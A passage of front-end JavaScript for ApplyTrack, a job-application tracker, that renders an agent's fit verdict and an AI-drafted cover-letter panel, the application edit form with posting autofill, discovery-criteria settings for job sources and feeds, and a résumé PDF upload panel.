            <h3 id="verdict-heading">Fit verdict</h3>
            <p class="field-help">The agent hasn't judged this lead yet.</p>
          </div>
          ${evalBtn}
        </div>
      </section>`;
  }
  const proceed = v.decision === "proceed";
  const concerns = (v.concerns || []).map((c) => `<li>${escapeHtml(c)}</li>`).join("");
  const disq = (v.disqualifiers || []).map((c) => `<li>${escapeHtml(c)}</li>`).join("");
  const when = data.agent_verdict.created_at ? new Date(data.agent_verdict.created_at).toLocaleString() : "";
  return `
    <section class="material-block" aria-labelledby="verdict-heading">
      <div class="material-header">
        <div>
          <div class="section-kicker">Agent</div>
          <h3 id="verdict-heading">Fit verdict</h3>
        </div>
        <div class="material-actions">${evalBtn}</div>
      </div>
      <p class="mt-3">
        <span class="link-status ${proceed ? "ok" : "bad"}">${proceed ? "Proceed" : "Skip"}</span>
        <span class="text-sm">· confidence ${escapeHtml(String(v.confidence ?? "?"))}%${v.model_consulted === false ? " · decided without the model" : ""}${when ? ` · ${escapeHtml(when)}` : ""}</span>
      </p>
      <p class="mt-2">${escapeHtml(v.rationale || "")}</p>
      ${disq ? `<p class="mt-2 field-help">Disqualified because:</p><ul class="verdict-list text-sm">${disq}</ul>` : ""}
      ${concerns ? `<p class="mt-2 field-help">Worth checking:</p><ul class="verdict-list text-sm">${concerns}</ul>` : ""}
    </section>`;
}

// Ask the agent to judge this lead now. Like drafting, this is a model round-trip.
async function evaluateFit(name, btn) {
  const label = btn.textContent;
  btn.disabled = true;
  btn.textContent = "Evaluating…";
  try {
    const r = await api("POST", `/api/apps/${encodeURIComponent(name)}/verdict`);
    await openApp(name);
    toast(r.verdict && r.verdict.decision === "proceed" ? "Agent says: proceed." : "Agent says: skip.");
  } catch (e) {
    btn.disabled = false;
    btn.textContent = label;
    toast(e.message);
  }
}

// Probe the entry's posting link server-side and show the verdict inline.
async function investigateLink(name, btn) {
  const out = document.getElementById("link-status");
  const label = btn.textContent;
  btn.disabled = true;
  btn.textContent = "Investigating…";
  if (out) out.innerHTML = "";
  try {
    const r = await api("GET", `/api/apps/${encodeURIComponent(name)}/check-link`);
    if (out) {
      const tail =
        r.final_url && r.final_url !== r.url
          ? ` <span class="text-ink-faint">→ ${escapeHtml(r.final_url)}</span>`
          : "";
      out.innerHTML = `<span class="link-status ${r.ok ? "ok" : "bad"}">${escapeHtml(r.summary)}</span>${tail}`;
    }
    toast(r.ok ? "Link looks live." : "Link looks broken.");
  } catch (e) {
    toast(e.message);
  } finally {
    btn.disabled = false;
    btn.textContent = label;
  }
}

function isoDate(offsetDays = 0) {
  const d = new Date();
  d.setDate(d.getDate() + offsetDays);
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
}

// The cover-letter panel on the app sheet. `material` is the letter TEXT (stored
// per-app server-side), so it renders inline with copy / download / regenerate /
// discard — no filesystem path. Absent material shows the generate affordance.
function materialSection(data) {
  // The tenant turned the engine off (Settings · AI): no drafting UI at all.
  if (!state.coverLettersEnabled && !data.material) return "";
  if (!data.material) {
    return `
      <section class="material-block">
        <div class="material-header">
          <div>
            <div class="section-kicker">AI workspace</div>
            <h3>Cover letter</h3>
            <p class="field-help">Draft a tailored letter from your résumé via the configured AI.</p>
          </div>
          <button class="btn btn-primary shrink-0" data-act="draft">Generate cover letter</button>
        </div>
      </section>`;
  }
  const html = renderUntrustedMarkdown(data.material, { gfm: true, breaks: true });
  // Regenerate is a drafting affordance — hide it when the engine is off (the server
  // refuses the draft anyway). Copy / Download / Discard act on the stored letter, so
  // they stay available.
  const regenerate = state.coverLettersEnabled
    ? `<button class="btn btn-ghost btn-xs" data-act="draft">Regenerate</button>`
    : "";
  return `
    <section class="material-block">
      <div class="material-header">
        <div>
          <div class="section-kicker">AI workspace</div>
          <h3>Cover letter</h3>
        </div>
        <div class="material-actions">
          <button class="btn btn-ghost btn-xs" data-act="mat-copy">Copy</button>
          <button class="btn btn-ghost btn-xs" data-act="mat-download">Download .md</button>
          <button class="btn btn-ghost btn-xs" data-act="mat-pdf">Download PDF</button>
          ${regenerate}
          <button class="btn btn-ghost btn-xs" data-act="mat-discard">Discard</button>
        </div>
      </div>
      <div class="prose-omi material-body mt-3">${html}</div>
    </section>`;
}

async function copyText(text, okMsg) {
  try {
    await navigator.clipboard.writeText(text);
    toast(okMsg);
  } catch (_) {
    toast("Couldn't copy to clipboard.");
  }
}

// Save the letter as a local Markdown file (cover letters are out of the export
// snapshot by design, so this is how a draft leaves the app).
function downloadMaterial(data) {
  const blob = new Blob([data.material], { type: "text/markdown" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `${stem(data.filename)}-cover-letter.md`;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}

async function downloadMaterialPdf(data) {
  try {
    const res = await fetch(`/api/apps/${encodeURIComponent(data.filename)}/cover-letter.pdf`, {
      credentials: "same-origin",
    });
    if (!res.ok) throw new Error("Couldn't download the cover letter PDF.");
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${stem(data.filename)}-cover-letter.pdf`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  } catch (e) {
    toast(e.message);
  }
}

async function discardMaterial(name) {
  if (!await confirmAction({
    title: "Discard cover letter?",
    message: "You can generate another cover letter later.",
    confirmLabel: "Discard",
  })) return;
  try {
    await api("DELETE", `/api/apps/${encodeURIComponent(name)}/cover-letter`);
    openApp(name);
    toast("Cover letter discarded.");
  } catch (e) {
    toast(e.message);
  }
}

// Draft a tailored cover letter on demand. The server shells out to the LLM, so
// this can take ~30s — disable the button and show progress meanwhile.
async function draftMaterial(name, btn) {
  const label = btn.textContent;
  btn.disabled = true;
  btn.textContent = "Drafting… (~30s)";
  try {
    await api("POST", `/api/apps/${encodeURIComponent(name)}/draft`);
    await refresh();
    openApp(name);
    toast("Cover letter drafted.");
  } catch (e) {
    btn.disabled = false;
    btn.textContent = label;
    toast(e.message);
  }
}

// Status shortcuts from the view: send the parsed fields back with overrides.
async function markStatus(data, action) {
  const fields = { ...data.fields };
  let msg;
  let advance = false;
  if (action === "applied") {
    fields.status = "applied";
    fields.applied = isoDate(0);
    fields.followup = isoDate(7);
    msg = "Marked applied · follow-up in 7 days.";
  } else if (action === "pass") {
    fields.status = "passed";
    msg = "Passed.";
    advance = true;
  } else {
    return;
  }
  try {
    const { filename } = await saveWithConflict(
      `/api/apps/${encodeURIComponent(data.filename)}`, fields, fields.company || data.filename);
    await refresh();
    // After a pass, jump to the next still-open role rather than lingering on
    // the one we just dismissed. Falls back to the dismissed entry if none left.
    const next = advance ? nextActionable(filename) : null;
    openApp(next || filename);
    toast(next ? "Passed · next up." : msg);
  } catch (e) {
    toast(e.message);
  }
}

// Blacklist this entry's company: future polls skip it, and its still-open leads
// are passed. Then jump to the next actionable role, like Pass.
async function blacklistCompany(data) {
  const company = data.fields.company || stem(data.filename);
  if (!await confirmAction({
    title: `Blacklist ${company}?`,
    message: "Future polls will skip this company and its open leads will be passed.",
    confirmLabel: "Blacklist company",
  }))
    return;
  try {
    const r = await api("POST", `/api/apps/${encodeURIComponent(data.filename)}/blacklist`);
    await refresh();
    const next = nextActionable(data.filename);
    openApp(next || data.filename);
    toast(`Blacklisted ${r.company} · ${r.passed} lead${r.passed === 1 ? "" : "s"} passed.`);
  } catch (e) {
    toast(e.message);
  }
}

// ---- Structured form ------------------------------------------------------

function laneOptions(sel) {
  return LANES.map((l) => `<option value="${l}"${l === sel ? " selected" : ""}>${LANE_LABEL[l]}</option>`).join("");
}
function statusOptions(sel) {
  return STATUSES.map((s) => `<option value="${s}"${s === sel ? " selected" : ""}>${STATUS_LABEL[s]}</option>`).join("");
}

function formMarkup(f, { isNew }) {
  const eyebrow = isNew ? "New application" : `Editing · ${escapeHtml(state.current)}`;
  return `
    <article class="sheet">
      <h2>${eyebrow}</h2>
      <div id="form-errors" class="error-summary" role="alert" tabindex="-1" hidden></div>
      <div class="field">
        <label class="field-label" for="f-company">Company <span aria-hidden="true">*</span></label>
        <input id="f-company" class="title-input" required aria-describedby="company-help" value="${escapeHtml(f.company || "")}" />
        <span id="company-help" class="field-help">Required</span>
      </div>

      <div class="mt-4">
        <label class="field-label" for="f-role">Role</label>
        <input id="f-role" class="field-input" value="${escapeHtml(f.role || "")}" placeholder="Senior .NET Engineer" />
      </div>

      <div class="mt-4 grid grid-cols-2 gap-4">
        <div>
          <label class="field-label" for="f-lane">Lane</label>
          <select id="f-lane" class="field-input mono">${laneOptions(f.lane || "ai")}</select>
        </div>
        <div>
          <label class="field-label" for="f-status">Status</label>
          <select id="f-status" class="field-input mono">${statusOptions(f.status || "lead")}</select>
        </div>
      </div>

      <div class="mt-4">
        <label class="field-label" for="f-link">Posting link</label>
        <div class="flex gap-2">
          <input id="f-link" type="url" class="field-input mono flex-1" value="${escapeHtml(f.link || "")}" placeholder="https://example.com/job" />
          <button id="f-autofill" class="btn btn-ghost shrink-0" type="button"
            title="Fetch the posting and fill in the empty fields">⤓ Autofill</button>
        </div>
      </div>

      <div class="mt-4 grid grid-cols-2 gap-4">
        <div>
          <label class="field-label" for="f-location">Location</label>
          <input id="f-location" class="field-input" value="${escapeHtml(f.location || "")}" placeholder="Remote / Lincoln, NE" />
        </div>
        <div>
          <label class="field-label" for="f-salary">Compensation</label>
          <input id="f-salary" class="field-input" value="${escapeHtml(f.salary || "")}" placeholder="optional" />
        </div>
      </div>

      <div class="mt-4 agent-grid">
        <div>
          <label class="field-label" for="f-applied">Applied</label>
          <input id="f-applied" type="date" class="field-input mono" value="${escapeHtml(f.applied || "")}" />
        </div>
        <div>
          <label class="field-label" for="f-followup">Follow-up</label>
          <input id="f-followup" type="date" class="field-input mono" value="${escapeHtml(f.followup || "")}" />
        </div>
        <div>
          <label class="field-label" for="f-score">Fit score</label>
          <input id="f-score" type="number" min="0" max="100" class="field-input mono" value="${escapeHtml(f.score || "")}" placeholder="0 to 100" />
        </div>
      </div>

      <div class="mt-4">
        <label class="field-label" for="f-source">Source</label>
        <input id="f-source" class="field-input mono" value="${escapeHtml(f.source || "")}" placeholder="company careers / auto:remotive" />
      </div>

      <div class="mt-4 grid grid-cols-2 gap-4">
        <div>
          <label class="field-label" for="f-contact">Contact</label>
          <input id="f-contact" class="field-input" value="${escapeHtml(f.contact || "")}" placeholder="Hiring manager / recruiter" />
        </div>
        <div>
          <label class="field-label" for="f-contact-email">Contact email</label>
          <input id="f-contact-email" type="email" class="field-input mono" value="${escapeHtml(f.contact_email || "")}" placeholder="name@company.com" />
        </div>
      </div>

      <div class="mt-4">
        <label class="field-label" for="f-notes">Notes</label>
        <textarea id="f-notes" class="field-textarea" rows="9" placeholder="Why it fits, contacts, JD keywords, interview notes…">${escapeHtml(f.notes || "")}</textarea>
      </div>

      <div class="mt-7 flex items-center justify-between border-t border-rule pt-4">
        <div>${isNew ? "" : `<button class="btn btn-danger" data-act="delete">Delete</button>`}</div>
        <div class="flex gap-2">
          <button type="button" class="btn btn-ghost" data-act="cancel">Cancel</button>
          <button type="button" class="btn btn-primary" data-act="save">${isNew ? "Create" : "Save"}</button>
        </div>
      </div>
    </article>`;
}

function gatherFields() {
  return {
    company: $("#f-company").value.trim(),
    role: $("#f-role").value.trim(),
    lane: $("#f-lane").value,
    status: $("#f-status").value,
    link: $("#f-link").value.trim(),
    location: $("#f-location").value.trim(),
    salary: $("#f-salary").value.trim(),
    source: $("#f-source").value.trim(),
    contact: $("#f-contact").value.trim(),
    contact_email: $("#f-contact-email").value.trim(),
    applied: $("#f-applied").value.trim(),
    followup: $("#f-followup").value.trim(),
    score: $("#f-score").value.trim(),
    notes: $("#f-notes").value,
  };
}

function openEdit(data) {
  state.mode = "edit";
  syncPipelineButton();
  contentEl.innerHTML = formMarkup(data.fields, { isNew: false });
  wireForm({ isNew: false });
  document.title = `Edit ${data.fields.company || stem(data.filename)} | ApplyTrack`;
  focusView("h2");
}

function openNew() {
  state.mode = "new";
  syncPipelineButton();
  state.current = null;
  showDetailPane();
  renderSidebar();
  const today = new Date().toISOString().slice(0, 10);
  contentEl.innerHTML = formMarkup({ created: today, lane: "ai", status: "lead" }, { isNew: true });
  wireForm({ isNew: true });
  document.title = "New application | ApplyTrack";
  $("#f-company").focus();
}

function wireForm({ isNew }) {
  contentEl.querySelector('[data-act="cancel"]').onclick = () =>
    state.current ? openApp(state.current) : renderEmpty();
  contentEl.querySelector('[data-act="save"]').onclick = async () => {
    const fields = gatherFields();
    const company = $("#f-company");
    const summary = $("#form-errors");
    company.removeAttribute("aria-invalid");
    summary.hidden = true;
    if (!fields.company) {
      company.setAttribute("aria-invalid", "true");
      summary.textContent = "Enter a company before saving this application.";
      summary.hidden = false;
      summary.focus();
      announce(summary.textContent, true);
      return;
    }
    try {
      if (isNew) {
        const { filename } = await api("POST", "/api/apps", fields);
        await refresh();
        openApp(filename);
        toast("Created.");
      } else {
        const { filename } = await saveWithConflict(
          `/api/apps/${encodeURIComponent(state.current)}`, fields, state.current);
        await refresh();
        openApp(filename);
        toast("Saved.");
      }
    } catch (e) {
      toast(e.message);
    }
  };
  const del = contentEl.querySelector('[data-act="delete"]');
  if (del) del.onclick = () => deleteApp(state.current);

  // Autofill: scrape the posting server-side and fill only the still-empty fields,
  // so it never clobbers anything the user already typed.
  const autofill = contentEl.querySelector("#f-autofill");
  autofill.onclick = async () => {
    const url = $("#f-link").value.trim();
    if (!url) return toast("Paste a posting link first.");
    const label = autofill.textContent;
    autofill.disabled = true;
    autofill.textContent = "Fetching…";
    try {
      const r = await api("POST", "/api/scrape", { url });
      let filled = 0;
      const fill = (sel, val) => {
        const el = $(sel);
        if (val && !el.value.trim()) { el.value = val; filled++; }
      };
      fill("#f-company", r.company);
      fill("#f-role", r.role);
      fill("#f-location", r.location);
      fill("#f-salary", r.salary);
      fill("#f-source", r.source);
      fill("#f-notes", r.description);
      toast(filled ? `Filled ${filled} field${filled === 1 ? "" : "s"}.` : "Couldn't find job data on that page.");
    } catch (e) {
      toast(e.message);
    } finally {
      autofill.disabled = false;
      autofill.textContent = label;
    }
  };
}

// ---- Raw editor -----------------------------------------------------------

function openRaw(data) {
  state.mode = "raw";
  syncPipelineButton();
  contentEl.innerHTML = `
    <article class="sheet">
      <div class="view-header">
        <h2>Raw source for ${escapeHtml(data.filename)}</h2>
        <div class="seg" role="tablist" aria-label="Application editor mode">
          <button type="button" role="tab" aria-selected="false" data-act="form">Form</button>
          <button type="button" role="tab" aria-selected="true">Raw source</button>
        </div>
      </div>
      <label class="field" for="f-raw"><span class="field-label">Application Markdown</span>
      <textarea id="f-raw" class="field-textarea mono mt-4" rows="24" spellcheck="false">${escapeHtml(data.raw)}</textarea></label>
      <div class="mt-5 flex justify-end gap-2 border-t border-rule pt-4">
        <button class="btn btn-ghost" data-act="cancel">Cancel</button>
        <button class="btn btn-primary" data-act="save">Save source</button>
      </div>
    </article>`;
  document.title = `Raw source | ApplyTrack`;
  focusView("h2");
  contentEl.querySelector('[data-act="form"]').onclick = () => openEdit(data);
  contentEl.querySelector('[data-act="cancel"]').onclick = () => openApp(data.filename);
  contentEl.querySelector('[data-act="save"]').onclick = async () => {
    try {
      await saveWithConflict(
        `/api/apps/${encodeURIComponent(data.filename)}/raw`,
        { content: $("#f-raw").value }, data.filename);
      await refresh();
      openApp(data.filename);
      toast("Saved.");
    } catch (e) {
      toast(e.message);
    }
  };
}

// ---- Delete ---------------------------------------------------------------

async function deleteApp(name) {
  if (!await confirmAction({
    title: `Delete ${stem(name)}?`,
    message: "This permanently deletes the application and its saved cover letter.",
    confirmLabel: "Delete application",
  })) return;
  try {
    await api("DELETE", `/api/apps/${encodeURIComponent(name)}`);
    await refresh();
    renderEmpty();
    toast("Deleted.");
  } catch (e) {
    toast(e.message);
  }
}

// ---- Criteria panel -------------------------------------------------------

// Built-in source ids + display labels, mirroring applytrack.criteria.
// BUILTIN_SOURCES. The /api/criteria payload always carries all of them.
const SOURCES = [
  "remotive", "remoteok", "arbeitnow", "jobicy", "weworkremotely",
  "remotefirstjobs", "workanywhere", "hn_whoishiring", "mygreenhouse", "linkedin",
  "handshake",
];
const SOURCE_LABEL = {
  remotive: "Remotive",
  remoteok: "RemoteOK",
  arbeitnow: "Arbeitnow",
  jobicy: "Jobicy",
  weworkremotely: "We Work Remotely",
  remotefirstjobs: "RemoteFirstJobs",
  workanywhere: "WorkAnywhere.pro",
  hn_whoishiring: "HN “Who is hiring”",
  mygreenhouse: "MyGreenhouse (signed in — needs a board account for greenhouse.io and your mailbox)",
  linkedin: "LinkedIn (your own account — a board account for linkedin.com with its password; only postings whose Apply leads to the employer's site, Easy Apply skipped)",
  handshake: "Handshake (your own account — a board account for joinhandshake.com with your school email and password; only postings that apply on the employer's own site)",
};
const ATS_PROVIDERS = ["greenhouse", "lever", "paylocity"];
// Paylocity boards are keyed by the company's recruiting GUID, not a name slug, and
// what a user has to hand is the board URL. Pull the GUID out of whatever is pasted
// so the field accepts either; Criteria.Normalize does the same server-side.
const PAYLOCITY_GUID_RE = /[0-9a-fA-F]{8}(?:-[0-9a-fA-F]{4}){3}-[0-9a-fA-F]{12}/;
// What the slug box should say, per provider.
const BOARD_SLUG_HINT = {
  greenhouse: "company slug (e.g. stripe)",
  lever: "company slug (e.g. netflix)",
  paylocity: "board URL or company GUID",
};
// Mirrors InputLimits.RssFeeds server-side; enforced here too so the add button can
// say why it refused instead of the save failing later.
const MAX_RSS_FEEDS = 25;

// Holds the ATS boards and custom feeds being edited (add/remove re-renders only
// the affected list, so an unsaved keyword box isn't blown away).
let criteriaBoards = [];
let criteriaFeeds = [];

function sourceToggles(sources) {
  return SOURCES.map((id) => {
    const on = sources[id] ? " checked" : "";
    return `<label class="source-row">
      <input type="checkbox" data-source="${id}"${on} />
      <span>${escapeHtml(SOURCE_LABEL[id] || id)}</span>
    </label>`;
  }).join("");
}

function boardRows() {
  if (!criteriaBoards.length) {
    return `<div class="board-empty field-help">No ATS boards added.</div>`;
  }
  return criteriaBoards.map((b, i) =>
    `<div class="board-row">
      <span class="board-prov">${escapeHtml(b.provider)}</span>
      <span class="board-slug mono">${escapeHtml(b.slug)}</span>
      <button class="btn btn-ghost btn-xs" data-remove-board="${i}" type="button"
        aria-label="Remove ${escapeHtml(b.provider)} board ${escapeHtml(b.slug)}">Remove</button>
    </div>`).join("");
}

function renderBoards() {
  const el = $("#criteria-boards");
  if (!el) return;
  el.innerHTML = boardRows();
  el.querySelectorAll("[data-remove-board]").forEach((btn) => {
    btn.onclick = () => {
      criteriaBoards.splice(Number(btn.dataset.removeBoard), 1);
      renderBoards();
    };
  });
}

function feedRows() {
  if (!criteriaFeeds.length) {
    return `<div class="board-empty field-help">No custom feeds added.</div>`;
  }
  return criteriaFeeds.map((url, i) =>
    `<div class="board-row">
      <span class="board-slug mono">${escapeHtml(url)}</span>
      <button class="btn btn-ghost btn-xs" data-remove-feed="${i}" type="button"
        aria-label="Remove feed ${escapeHtml(url)}">Remove</button>
    </div>`).join("");
}

function renderFeeds() {
  const el = $("#criteria-feeds");
  if (!el) return;
  el.innerHTML = feedRows();
  el.querySelectorAll("[data-remove-feed]").forEach((btn) => {
    btn.onclick = () => {
      criteriaFeeds.splice(Number(btn.dataset.removeFeed), 1);
      renderFeeds();
    };
  });
}

function criteriaMarkup(c) {
  return `
    <article class="sheet">
      <div class="flex items-start justify-between gap-4">
        <div>
          <div class="sheet-eyebrow">Discovery criteria</div>
          <h2 class="sheet-title">What the poller looks for</h2>
        </div>
      </div>
      <p class="field-help">
        Saved to <span class="mono">applications/.criteria.json</span> · used by every poll.
      </p>

      <div class="mt-5">
        <label class="field-label" for="c-keywords">Keywords — one per line; any match stages a lead</label>
        <textarea id="c-keywords" class="field-textarea mono" rows="8"
          placeholder="developer advocate&#10;ai engineer&#10;.net">${escapeHtml((c.keywords || []).join("\n"))}</textarea>
      </div>

      <div class="mt-4 grid grid-cols-2 gap-4">
        <div>
          <label class="field-label" for="c-lane">Default lane — routes the cover letter</label>
          <select id="c-lane" class="field-input mono">${laneOptions(c.default_lane || "ai")}</select>
        </div>
        <div>
          <label class="field-label" for="c-score">Minimum fit score (0 to 100)</label>
          <input id="c-score" type="number" min="0" max="100" class="field-input mono"
            value="${escapeHtml(String(c.min_fit_score ?? 55))}" />
        </div>
      </div>

      <div class="mt-4">
        <div class="field-label">Location filters</div>
        <label class="source-row">
          <input id="c-remote-only" type="checkbox"${c.remote_only ? " checked" : ""} />
          <span>Remote-friendly roles only</span>
        </label>
        <input id="c-exclude" class="field-input mono mt-2"
          value="${escapeHtml((c.exclude_locations || []).join(", "))}"
          placeholder="exclude locations, comma-separated (e.g. India, Brazil)" />
      </div>

      <div class="mt-4">
        <div class="field-label">Sources</div>
        <div class="source-grid">${sourceToggles(c.sources || {})}</div>
      </div>

      <div class="mt-4">
        <div class="field-label">ATS boards — follow a company's Greenhouse, Lever, or Paylocity board</div>
        <div id="criteria-boards" class="board-list"></div>
        <div class="board-add mt-2">
          <select id="c-board-provider" class="field-input mono" aria-label="ATS provider">
            ${ATS_PROVIDERS.map((p) => `<option value="${p}">${p}</option>`).join("")}
          </select>
          <input id="c-board-slug" class="field-input mono" aria-label="Company board slug" placeholder="${BOARD_SLUG_HINT[ATS_PROVIDERS[0]]}" />
          <button class="btn btn-ghost" data-act="add-board" type="button">+ Add board</button>
        </div>
      </div>

      <div class="mt-4">
        <div class="field-label">Custom RSS feeds — follow any job feed the built-in sources miss</div>
        <p class="field-help">
          Paste the URL of an RSS or Atom feed (a company careers feed, a niche board,
          a saved search). Items are scored against the same keywords and minimum fit.
        </p>
        <div id="criteria-feeds" class="board-list mt-2"></div>
        <div class="feed-add mt-2">
          <label class="sr-only" for="c-feed-url">Feed URL</label>
          <input id="c-feed-url" class="field-input mono" type="url"
            placeholder="https://example.com/careers.rss" />
          <button class="btn btn-ghost" data-act="add-feed" type="button">+ Add feed</button>
        </div>
      </div>

      <div class="mt-7 flex items-center justify-end gap-2 border-t border-rule pt-4">
        <button class="btn btn-ghost" data-act="cancel">Cancel</button>
        <button class="btn btn-primary" data-act="save">Save criteria</button>
      </div>
    </article>`;
}

function gatherCriteria() {
  const keywords = $("#c-keywords").value
    .split(/[\n,]/).map((s) => s.trim()).filter(Boolean);
  const exclude = $("#c-exclude").value
    .split(",").map((s) => s.trim()).filter(Boolean);
  const sources = {};
  contentEl.querySelectorAll("[data-source]").forEach((cb) => {
    sources[cb.dataset.source] = cb.checked;
  });
  return {
    keywords,
    default_lane: $("#c-lane").value,
    min_fit_score: Number($("#c-score").value) || 0,
    remote_only: $("#c-remote-only").checked,
    exclude_locations: exclude,
    sources,
    ats_boards: criteriaBoards.map((b) => ({ provider: b.provider, slug: b.slug })),
    rss_feeds: criteriaFeeds.slice(),
  };
}

function wireCriteria() {
  contentEl.querySelector('[data-act="cancel"]').onclick = () =>
    state.current ? openApp(state.current) : renderEmpty();
  const boardProvider = $("#c-board-provider");
  if (boardProvider) {
    boardProvider.onchange = () => {
      const slugInput = $("#c-board-slug");
      if (slugInput) slugInput.placeholder = BOARD_SLUG_HINT[boardProvider.value] || "company slug";
    };
  }
  contentEl.querySelector('[data-act="add-board"]').onclick = () => {
    const provider = $("#c-board-provider").value;
    let slug = $("#c-board-slug").value.trim();
    if (provider === "paylocity") {
      const guid = PAYLOCITY_GUID_RE.exec(slug);
      if (!guid) {
        return toast("Paste the Paylocity board URL, or the company GUID inside it.");
      }
      slug = guid[0].toLowerCase();
    }
    if (!slug) return toast("Enter a company slug to add a board.");
    const dup = criteriaBoards.some(
      (b) => b.provider === provider && b.slug.toLowerCase() === slug.toLowerCase());
    if (dup) return toast("That board is already in the list.");
    criteriaBoards.push({ provider, slug });
    $("#c-board-slug").value = "";
    renderBoards();
  };
  contentEl.querySelector('[data-act="add-feed"]').onclick = () => {
    const input = $("#c-feed-url");
    const url = input.value.trim();
    if (!url) return toast("Paste a feed URL to add it.");
    // The server drops anything that isn't an absolute http(s) URL, so say so here
    // rather than letting the entry vanish silently on save.
    if (!/^https?:\/\//i.test(url)) return toast("A feed URL must start with http:// or https://");
    if (criteriaFeeds.some((f) => f.toLowerCase() === url.toLowerCase()))
      return toast("That feed is already in the list.");
    if (criteriaFeeds.length >= MAX_RSS_FEEDS)
      return toast(`You can follow at most ${MAX_RSS_FEEDS} custom feeds.`);
    criteriaFeeds.push(url);
    input.value = "";
    renderFeeds();
  };
  contentEl.querySelector('[data-act="save"]').onclick = async () => {
    try {
      await api("PUT", "/api/criteria", gatherCriteria());
      toast("Criteria saved.");
    } catch (e) {
      toast(e.message);
    }
  };
}

// Settings · Criteria tab.
async function loadCriteriaTab(body, gen = settingsGen) {
  const c = await api("GET", "/api/criteria");
  if (settingsSuperseded(gen)) return;
  criteriaBoards = (c.ats_boards || []).map((b) => ({ provider: b.provider, slug: b.slug }));
  criteriaFeeds = (c.rss_feeds || []).slice();
  body.innerHTML = criteriaMarkup(c);
  renderBoards();
  renderFeeds();
  wireCriteria();
}

// ---- Résumé panel ---------------------------------------------------------

// Uploaded résumé text feeds the cover-letter prompt as the only facts the model
// may assert. Older structured résumé fields still round-trip through the API for
// compatibility, but the settings UI now treats the PDF upload as the source.
function resumePreviewText(r) {
  const lines = [];
  const fullName = (r.full_name || "").trim();
  const headline = (r.headline || "").trim();
  const location = (r.location || "").trim();
  const summary = (r.summary || "").trim();

  if (fullName || headline)
    lines.push(fullName && headline ? `${fullName} - ${headline}` : (fullName || headline));
  if (location) lines.push(`Location: ${location}`);
  if (summary) {
    if (lines.length) lines.push("");
    lines.push(summary);
  }

  const experience = r.experience || [];
  if (experience.length) {
    lines.push("", "Experience:");
    experience.forEach((e) => {
      const head = [e.title, e.company, e.dates].filter(Boolean).join(" · ");
      if (head) lines.push(`- ${head}`);
      (e.highlights || []).filter(Boolean).forEach((h) => lines.push(`  - ${h}`));
    });
  }
  const education = r.education || [];
  if (education.length) {
    lines.push("", "Education:");
    education.forEach((e) => {
      const head = [e.degree, e.field, e.school, e.dates].filter(Boolean).join(" · ");
      if (head) lines.push(`- ${head}`);
    });
  }
  if ((r.skills || []).length) lines.push("", `Skills: ${(r.skills || []).join(", ")}`);
  if ((r.certifications || []).length) lines.push("", `Certifications: ${(r.certifications || []).join(", ")}`);
  if ((r.links || []).length) {
    lines.push("", "Links:");
    (r.links || []).forEach((l) => {
      if (l.url) lines.push(l.label ? `- ${l.label}: ${l.url}` : `- ${l.url}`);
    });
  }

  return lines.join("\n").trim();
}

function resumePreviewMarkup(r) {
  const text = resumePreviewText(r);
  if (!text) {
    return `
      <section class="resume-preview-wrap mt-5" aria-labelledby="resume-preview-title">
        <h3 id="resume-preview-title">Current résumé</h3>
        <div class="resume-preview-empty field-help">No résumé PDF has been uploaded yet.</div>
      </section>`;
  }

  const preview = text.length > 6000
    ? `${text.slice(0, 6000).trimEnd()}\n[preview truncated]`
    : text;
  return `
    <section class="resume-preview-wrap mt-5" aria-labelledby="resume-preview-title">
      <h3 id="resume-preview-title">Current résumé text</h3>
      <pre class="resume-preview" tabindex="0">${escapeHtml(preview)}</pre>
    </section>`;
}

function resumeMarkup(r) {
  return `
    <article class="sheet">
      <div class="sheet-eyebrow">Résumé</div>
      <h2 class="sheet-title">The facts behind your cover letters</h2>
      <p class="field-help">
        The drafting AI may assert only what's in your uploaded résumé.
      </p>

      <section class="resume-upload mt-5" aria-labelledby="resume-upload-title">
        <div>
          <h3 id="resume-upload-title">Upload a PDF résumé</h3>
          <p class="field-help">
            Text-based PDFs are extracted and stored as the résumé text for cover-letter drafting.
          </p>
        </div>
        <div class="resume-upload-actions">
          <label class="field-label sr-only" for="r-pdf">Résumé PDF file</label>
          <input id="r-pdf" class="field-input" type="file" accept="application/pdf,.pdf" />
          <button class="btn btn-ghost" data-act="upload-resume" type="button">Upload PDF</button>
        </div>
      </section>

      ${resumePreviewMarkup(r)}
    </article>`;
}

function wireResume() {
  contentEl.querySelector('[data-act="upload-resume"]').onclick = async () => {
    const input = $("#r-pdf");
    const file = input.files?.[0];
    if (!file) {
      toast("Choose a PDF résumé first.");
      input.focus();
      return;
    }
    const btn = contentEl.querySelector('[data-act="upload-resume"]');
    const label = btn.textContent;
    btn.disabled = true;
    btn.textContent = "Uploading…";
    let uploaded = null;
    try {
      const form = new FormData();
      form.append("resume", file);
      uploaded = await api.form("/api/resume/upload", form);
      toast("Résumé PDF uploaded.");
    } catch (e) {
      toast(e.message);
    } finally {
      btn.disabled = false;
      btn.textContent = label;
    }
    if (uploaded) {
      contentEl.innerHTML = resumeMarkup(uploaded);
      wireResume();
      focusView("#resume-preview-title");
    }
  };
}

// Settings · Résumé tab.
async function loadResumeTab(body, gen = settingsGen) {
  const r = await api("GET", "/api/resume");
  if (settingsSuperseded(gen)) return;
  body.innerHTML = resumeMarkup(r);
  wireResume();
}

// ---- AI / LLM settings panel ----------------------------------------------

function llmMarkup(s) {
  const inst = s.instance || {};
  const secretsOff = !s.secrets_available;
  const keyNote = secretsOff
    ? "Set APPLYTRACK_SECRETS_KEY on the server to store a per-tenant key."
    : s.has_api_key
    ? "A key is saved (hidden). Enter a new one to replace it, or tick the box to remove it."
    : "No key saved. The instance default key (if any) is used.";
  return `
    <article class="sheet">
      <div class="sheet-eyebrow">AI · cover-letter endpoint</div>
      <h2 class="sheet-title">Where cover letters are drafted</h2>
      <p class="field-help">
        Any OpenAI-compatible endpoint — a local model (Ollama / vLLM) or a hosted provider.
        Leave a field blank to inherit the instance default.
      </p>

      <div class="mt-5">
        <label class="source-row">
          <input id="l-enabled" type="checkbox"${s.cover_letters_enabled === false ? "" : " checked"} />
